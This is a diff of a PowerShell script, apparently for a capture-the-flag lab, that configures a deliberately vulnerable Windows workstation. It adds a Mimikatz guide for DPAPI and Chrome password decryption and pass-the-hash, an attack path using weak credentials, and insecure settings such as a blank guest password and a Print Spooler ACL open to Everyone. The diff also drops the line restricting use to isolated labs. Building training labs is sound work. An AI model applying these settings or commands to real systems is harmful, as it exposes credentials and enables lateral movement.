+        
+        <h3>DPAPI Decryption:</h3>
+        <pre>
+# Get DPAPI masterkeys
+sekurlsa::dpapi
+
+# Decrypt DPAPI blob
+dpapi::blob /in:C:\Users\Public\Documents\dpapi_flag.bin
+
+# Chrome passwords
+dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data"
+        </pre>
+        
+        <h3>Pass-the-Hash from Workstation:</h3>
+        <pre>
+# PTH with NTLM hash
+sekurlsa::pth /user:localadmin /ntlm:HASH /domain:. /run:cmd.exe
+
+# PTH to server
+sekurlsa::pth /user:Administrator /ntlm:HASH /domain:. /run:"mstsc /v:$ServerName"
+        </pre>
+        
         <h2>Attack Path Suggestions</h2>
         <ol>
-            <li><strong>Initial Access:</strong> Try password spraying common credentials against RDP</li>
-            <li><strong>User Enumeration:</strong> List local users and check their properties</li>
-            <li><strong>Service Enumeration:</strong> Look for unquoted service paths</li>
-            <li><strong>Registry Check:</strong> Verify AlwaysInstallElevated settings</li>
-            <li><strong>Privilege Escalation:</strong> Exploit unquoted paths or MSI installation</li>
-            <li><strong>Credential Extraction:</strong> Dump browser passwords and DPAPI blobs</li>
-            <li><strong>Persistence Review:</strong> Examine startup locations and scheduled tasks</li>
-            <li><strong>Lateral Movement:</strong> Use found credentials to access the server</li>
+            <li><strong>Initial Access:</strong> RDP with weak credentials (jsmith/Welcome1)</li>
+            <li><strong>Privilege Escalation:</strong> Unquoted service paths or AlwaysInstallElevated</li>
+            <li><strong>Credential Extraction:</strong> Run Mimikatz to dump LSASS</li>
+            <li><strong>Lateral Movement:</strong> Pass-the-Hash to server using admin hashes</li>
+            <li><strong>Persistence:</strong> Create scheduled tasks with harvested credentials</li>
         </ol>
         
-        <h2>Workstation-Specific Tools</h2>
+        <h2>Tools for This Workstation</h2>
         <ul>
-            <li><strong>WinPEAS:</strong> Comprehensive enumeration including unquoted paths</li>
-            <li><strong>PowerUp:</strong> PowerShell privilege escalation checks</li>
-            <li><strong>Seatbelt:</strong> Security enumeration tool</li>
-            <li><strong>LaZagne:</strong> Extract passwords from browsers, WiFi, etc.</li>
-            <li><strong>SharpUp:</strong> C# privilege escalation enumeration</li>
-            <li><strong>Mimikatz:</strong> Credential extraction from memory</li>
+            <li><strong>Mimikatz:</strong> Latest version for all credential attacks</li>
+            <li><strong>Invoke-Mimikatz:</strong> PowerShell version for stealth</li>
+            <li><strong>LaZagne:</strong> Alternative for browser/application passwords</li>
+            <li><strong>ProcDump:</strong> Dump LSASS for offline analysis</li>
+            <li><strong>PowerSploit:</strong> Invoke-Mimikatz and other post-exploitation</li>
         </ul>
     </div>
 </body>
@@ -831,7 +881,7 @@ function Generate-FlagReport {
     $csvPath = $reportPath -replace '\.html$', '.csv'
     $global:FlagList | Export-Csv -Path $csvPath -NoTypeInformation
     
-    # Create a simple text file with just the flags for easy import to scoring system
+    # Create a simple text file with just the flags
     $flagsOnlyPath = $reportPath -replace '\.html$', '_flags_only.txt'
     $global:FlagList | ForEach-Object { $_.Flag } | Out-File $flagsOnlyPath -Encoding UTF8
     
@@ -843,20 +893,20 @@ function Generate-FlagReport {
 }
 
 # Main execution
-Write-Host "`nStarting vulnerable workstation configuration v3 with Pokemon CTF flags..." -ForegroundColor Cyan
+Write-Host "`nStarting vulnerable workstation configuration v5 (Mimikatz Edition)..." -ForegroundColor Cyan
 Write-Host "==========================================" -ForegroundColor Cyan
 
 # Run all configuration functions
 Create-VulnerableUsers
 Disable-WindowsSecurity
+Configure-WorkstationMimikatzVulnerabilities
+Configure-WorkstationDebugPrivileges
+Configure-WorkstationPassTheHash
 Create-VulnerableShares
 Configure-WorkstationRDP
 Create-WorkstationUnquotedPaths
 Configure-WorkstationAlwaysInstallElevated
 Configure-WorkstationPrintSpooler
-Configure-WorkstationKerberoasting
-Install-VulnerableSoftware
-Configure-BrowserVulnerabilities
 Create-PersistenceMechanisms
 Store-VulnerableCredentials
 Enable-LegacyProtocols
@@ -867,8 +917,6 @@ Create-ClipboardFlag
 Create-RecycleBinFlag
 Create-StickyNotesFlag
 Create-DPAPIFlag
-Create-OfficeRecentFlag
-Create-SearchIndexFlag
 
 # Additional workstation-specific vulnerabilities
 Write-Host "`nApplying additional workstation misconfigurations..." -ForegroundColor Yellow
@@ -891,7 +939,7 @@ net user guest ""
 sc.exe sdset Spooler "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;AU)(A;;RPWP;;;WD)"
 
 # Cached domain credentials (simulate)
-New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name CachedLogonsCount -Value 10 -Force
+New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name CachedLogonsCount -Value 50 -Force
 
 # Enable remote registry
 Set-Service RemoteRegistry -StartupType Automatic
@@ -903,47 +951,41 @@ if ($GenerateFlagReport) {
 }
 
 Write-Host "`n==========================================" -ForegroundColor Green
-Write-Host "Workstation vulnerability configuration v3 complete!" -ForegroundColor Green
+Write-Host "Workstation vulnerability configuration v5 complete!" -ForegroundColor Green
 Write-Host "==========================================" -ForegroundColor Green
 Write-Host ""
-Write-Host "NEW VULNERABILITIES IN v3:" -ForegroundColor Cyan
+Write-Host "MIMIKATZ-FRIENDLY FEATURES:" -ForegroundColor Cyan
+Write-Host "  WDigest enabled (plaintext passwords)" -ForegroundColor Yellow
+Write-Host "  LSA Protection disabled" -ForegroundColor Yellow
+Write-Host "  Debug privileges for debuguser" -ForegroundColor Yellow
+Write-Host "  Pass-the-Hash configured" -ForegroundColor Yellow
+Write-Host "  DPAPI secrets created" -ForegroundColor Yellow
+Write-Host ""
+Write-Host "OTHER VULNERABILITIES:" -ForegroundColor Cyan
 Write-Host "  Unquoted Service Paths (3 services)" -ForegroundColor Yellow
-Write-Host "  AlwaysInstallElevated MSI" -ForegroundColor Yellow
-Write-Host "  Print Spooler (Local exploitation)" -ForegroundColor Yellow
-Write-Host "  Service Account Weaknesses" -ForegroundColor Yellow
+Write-Host "  AlwaysInstallElevated enabled" -ForegroundColor Yellow
+Write-Host "  Print Spooler vulnerable" -ForegroundColor Yellow
 Write-Host ""
 Write-Host "POKEMON CTF FLAG STATISTICS:" -ForegroundColor Cyan
 Write-Host "  Total Flags Placed: $($global:FlagList.Count)" -ForegroundColor Yellow
 Write-Host "  Total Points Available: $(($global:FlagList | Measure-Object -Property Points -Sum).Sum)" -ForegroundColor Yellow
 Write-Host ""
-Write-Host "Vulnerable users created:" -ForegroundColor Cyan
+Write-Host "Users for Mimikatz testing:" -ForegroundColor Cyan
 Write-Host "  localadmin: admin123 (Admin)" -ForegroundColor Yellow
 Write-Host "  jsmith: Welcome1 (Auto-logon)" -ForegroundColor Yellow
 Write-Host "  mjones: Password1" -ForegroundColor Yellow
 Write-Host "  developer: dev123" -ForegroundColor Yellow
-Write-Host "  helpdesk: help123" -ForegroundColor Yellow
-Write-Host "  svc_backup: Backup2020!" -ForegroundColor Yellow
-Write-Host "  svc_web: Spring2021! (Service)" -ForegroundColor Yellow
-Write-Host "  svc_file: Autumn2020! (Service)" -ForegroundColor Yellow
-Write-Host ""
-Write-Host "Key vulnerabilities:" -ForegroundColor Cyan
-Write-Host "  - Auto-logon enabled (jsmith)" -ForegroundColor Yellow
-Write-Host "  - Unquoted service paths (multiple)" -ForegroundColor Yellow
-Write-Host "  - AlwaysInstallElevated enabled" -ForegroundColor Yellow
-Write-Host "  - Print Spooler vulnerable" -ForegroundColor Yellow
-Write-Host "  - Browser saved passwords" -ForegroundColor Yellow
-Write-Host "  - DLL hijacking opportunities" -ForegroundColor Yellow
-Write-Host "  - Multiple persistence mechanisms" -ForegroundColor Yellow
+Write-Host "  debuguser: Debug123! (has debug privs)" -ForegroundColor Yellow
 Write-Host ""
 Write-Host "Server connection:" -ForegroundColor Cyan
 Write-Host "  Configured to connect to: $ServerName" -ForegroundColor Yellow
 Write-Host "  Network drive mapped: Z:" -ForegroundColor Yellow
 Write-Host ""
 if ($GenerateFlagReport) {
-    Write-Host "Flag reports generated! Check HTML for full details." -ForegroundColor Green
+    Write-Host "Flag reports generated! Check HTML for Mimikatz guide." -ForegroundColor Green
 }
 Write-Host ""
 Write-Host "REMINDER: This workstation is now EXTREMELY VULNERABLE!" -ForegroundColor Red
-Write-Host "Only use in isolated lab environments!" -ForegroundColor Red
+Write-Host "Optimized for Mimikatz credential extraction!" -ForegroundColor Red
 Write-Host ""
 Write-Host "Please restart the workstation to ensure all changes take effect." -ForegroundColor Cyan
